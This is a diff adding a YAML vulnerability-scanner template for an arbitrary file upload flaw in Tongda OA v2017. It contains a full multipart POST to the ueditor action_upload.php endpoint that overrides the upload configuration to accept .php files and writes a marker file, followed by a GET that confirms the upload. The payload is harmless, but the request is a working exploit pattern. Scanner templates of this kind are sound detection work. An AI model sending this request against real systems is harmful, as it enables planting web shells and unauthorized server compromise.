@@ -1,0 +1,18 @@
+name: 通达OA-v2017-uploadfile
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /module/ueditor/php/action_upload.php?action=uploadfile
+    headers:
+      Content-Type: multipart/form-data; boundary=55719851240137822763221368724
+    body: "-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\nrscan\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\nRscan_test\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--"
+    expression:
+      status: 200
+  - method: GET
+    path: /rscan.php
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
